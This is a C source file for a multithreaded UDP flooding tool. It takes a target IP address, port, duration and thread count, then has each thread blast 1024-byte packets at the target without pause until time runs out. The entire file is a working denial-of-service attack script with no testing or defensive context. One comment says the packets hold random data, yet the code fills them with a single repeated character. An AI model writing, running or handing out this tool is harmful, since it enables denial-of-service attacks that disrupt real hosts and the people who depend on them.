#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define PACKET_SIZE 1024  // Size of the UDP packet (can be adjusted)

struct thread_args {
    char *target_ip;
    int target_port;
    int duration;
};

void *flood(void *args) {
    struct thread_args *targs = (struct thread_args *)args;
    int sockfd;
    struct sockaddr_in target_addr;
    char packet[PACKET_SIZE];

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Filling target address
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(targs->target_port);
    target_addr.sin_addr.s_addr = inet_addr(targs->target_ip);

    // Fill the packet with random data
    memset(packet, 'A', PACKET_SIZE);

    // Calculate end time
    time_t end_time = time(NULL) + targs->duration;

    // Sending packets until the time limit is reached
    while (time(NULL) < end_time) {
        sendto(sockfd, packet, PACKET_SIZE, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
    }

    close(sockfd);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <Port> <Time (seconds)> <Threads>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int num_threads = atoi(argv[4]);

    pthread_t threads[num_threads];
    struct thread_args targs;

    targs.target_ip = target_ip;
    targs.target_port = target_port;
    targs.duration = duration;

    // Create threads to flood the target
    for (int i = 0; i < num_threads; i++) {
        if (pthread_create(&threads[i], NULL, flood, &targs) != 0) {
            perror("Thread creation failed");
            exit(EXIT_FAILURE);
        }
    }

    // Join threads
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Packet flooding completed.\n");

    return 0;
}
